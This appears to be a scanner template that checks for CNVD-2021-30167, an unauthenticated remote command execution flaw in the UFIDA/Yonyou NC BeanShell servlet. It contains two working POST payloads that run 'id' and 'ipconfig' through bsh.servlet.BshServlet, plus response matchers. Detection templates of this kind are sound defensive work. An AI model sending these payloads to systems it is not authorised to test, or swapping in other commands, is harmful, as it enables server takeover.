id: CNVD-2021-30167
brief:
    title: UFIDA NC BeanShell Remote Command Execution
    by: pikpikcu
    level: critical
    about: UFIDA NC BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.
    label:
        - cnvd2021
        - cnvd
        - beanshell
        - rce
        - yonyou
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/servlet/~ic/bsh.servlet.BshServlet'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: bsh.script=exec("id");
      signs:
        - "on": word
          has:
            - uid=
            - Windows IP
          in: body
        - "on": word
          has:
            - BeanShell Test Servlet
          in: body
          need: all
        - "on": status
          status:
            - 200
    - verb: POST
      to:
        - '{{BaseURL}}/servlet/~ic/bsh.servlet.BshServlet'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: bsh.script=exec("ipconfig");
      signs:
        - "on": word
          has:
            - uid=
            - Windows IP
          in: body
        - "on": word
          has:
            - BeanShell Test Servlet
          in: body
          need: all
        - "on": status
          status:
            - 200
